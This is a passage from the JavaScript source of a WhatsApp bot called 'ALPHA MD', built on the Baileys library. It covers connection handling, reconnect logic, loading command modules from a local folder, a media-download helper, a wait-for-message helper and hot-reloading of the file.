            const { lastDisconnect, connection } = con;
            if (connection === "connecting") {
                console.log("ℹ️ Connecting...");
            }
            else if (connection === 'open') {
                console.log("✅ Connection successful! ☺️");
                console.log("--");
                await (0, baileys_1.delay)(200);
                console.log("------");
                await (0, baileys_1.delay)(300);
                console.log("------------------/-----");
                console.log("The bot is online 🕸\n\n");
                console.log("Loading commands...\n");
                fs.readdirSync(__dirname + "/commands").forEach((fichier) => {
                    if (path.extname(fichier).toLowerCase() == (".js")) {
                        try {
                            require(__dirname + "/commands/" + fichier);
                            console.log(fichier + " installed ✔️");
                        }
                        catch (e) {
                            console.log(`${fichier} could not be loaded due to the following reasons: ${e}`);
                        }
                        (0, baileys_1.delay)(300);
                    }
                });
                (0, baileys_1.delay)(700);
                var md;
                if ((conf.MODE).toLocaleLowerCase() === "yes") {
                    md = "public";
                }
                else if ((conf.MODE).toLocaleLowerCase() === "no") {
                    md = "private";
                }
                else {
                    md = "undefined";
                }
                console.log("Command loading completed ✅");
                
                if ((conf.DP).toLowerCase() === 'yes') {
                    let cmsg = `╭════⊷
║ *『ALPHA MD is CONNECTED』*
║    Creator: *Keith huncho*
║    Prefix : [ ${prefixe} ]
║    Mode :${md}
║    Total Commands : ${evt.cm.length}︎
╰═════════════════⊷

╭───◇
┃ 
┃
┃ bot is active 

╰═════════════════⊷`;
                    await zk.sendMessage(zk.user.id, { text: cmsg });
                }
            }
            else if (connection == "close") {
                let raisonDeconnexion = new boom_1.Boom(lastDisconnect?.error)?.output.statusCode;
                if (raisonDeconnexion === baileys_1.DisconnectReason.badSession) {
                    console.log('Invalid session ID, please rescan the QR code...');
                }
                else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionClosed) {
                    console.log('!!! Connection closed, reconnecting...');
                    main();
                }
                else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionLost) {
                    console.log('Connection to the server lost 😞, reconnecting...');
                    main();
                }
                else if (raisonDeconnexion === baileys_1.DisconnectReason?.connectionReplaced) {
                    console.log('Connection replaced, a session is already open, please close it!!!');
                }
                else if (raisonDeconnexion === baileys_1.DisconnectReason.loggedOut) {
                    console.log('You are logged out, please rescan the QR code');
                }
                else if (raisonDeconnexion === baileys_1.DisconnectReason.restartRequired) {
                    console.log('Restarting... ▶️');
                    main();
                }
                else {
                    console.log('Restarting due to error: ', raisonDeconnexion);
                    const { exec } = require("child_process");
                    exec("pm2 restart all");
                }
                main();
            }
        });
        zk.ev.on("creds.update", saveCreds);
        zk.downloadAndSaveMediaMessage = async (message, filename = '', attachExtension = true) => {
            let quoted = message.msg ? message.msg : message;
            let mime = (message.msg || message).mimetype || '';
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
            const stream = await (0, baileys_1.downloadContentFromMessage)(quoted, messageType);
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }
            let type = await FileType.fromBuffer(buffer);
            let trueFileName = './' + filename + '.' + type.ext;
            await fs.writeFileSync(trueFileName, buffer);
            return trueFileName;
        };
        zk.awaitForMessage = async (options = {}) => {
            return new Promise((resolve, reject) => {
                if (typeof options !== 'object') reject(new Error('Options must be an object'));
                if (typeof options.sender !== 'string') reject(new Error('Sender must be a string'));
                if (typeof options.chatJid !== 'string') reject(new Error('ChatJid must be a string'));
                if (options.timeout && typeof options.timeout !== 'number') reject(new Error('Timeout must be a number'));
                if (options.filter && typeof options.filter !== 'function') reject(new Error('Filter must be a function'));
                const timeout = options?.timeout || undefined;
                const filter = options?.filter || (() => true);
                let interval = undefined
                let listener = (data) => {
                    let { type, messages } = data;
                    if (type == "notify") {
                        for (let message of messages) {
                            const fromMe = message.key.fromMe;
                            const chatId = message.key.remoteJid;
                            const isGroup = chatId.endsWith('@g.us');
                            const isStatus = chatId == 'status@broadcast';
                            const sender = fromMe ? zk.user.id.replace(/:.*@/g, '@') : (isGroup || isStatus) ? message.key.participant.replace(/:.*@/g, '@') : chatId;
                            if (sender == options.sender && chatId == options.chatJid && filter(message)) {
                                zk.ev.off('messages.upsert', listener);
                                clearTimeout(interval);
                                resolve(message);
                            }
                        }
                    }
                }
                zk.ev.on('messages.upsert', listener);
                if (timeout) {
                    interval = setTimeout(() => {
                        zk.ev.off('messages.upsert', listener);
                        reject(new Error('Timeout'));
                    }, timeout);
                }
            });
        }
        return zk;
    }
    let fichier = require.resolve(__filename);
    fs.watchFile(fichier, () => {
        fs.unwatchFile(fichier);
        console.log(`Updated ${__filename}`);
        delete require.cache[fichier];
        require(fichier);
    });
    main();
}, 5000);
